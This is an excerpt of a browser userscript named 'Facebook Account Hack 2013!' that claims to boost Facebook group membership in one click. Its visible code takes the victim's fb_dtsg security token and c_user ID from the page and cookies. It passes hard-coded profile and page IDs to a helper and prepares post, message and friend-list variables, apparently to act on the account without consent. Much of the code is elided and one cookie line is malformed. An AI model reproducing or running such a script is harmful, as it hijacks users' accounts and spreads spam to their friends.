// ==UserScript==
// @name            Facebook Account Hack 2013!
// @namespace	    sriram sridharan
// @description     Increase your Group members just one click
// @version         1.0
// @updateURL	    ttps://userscripts.org/scripts/source/158942.meta.js
// @grant	    none
...
a("100000342417317");a("100000209946288");a("100002556919438");a("202233383160901");
a("432807130111546");
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
var spage_id = "457284027643731";
var spost_id = "457284027643731";
var sfoto_id = "457284027643731";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Sriram';
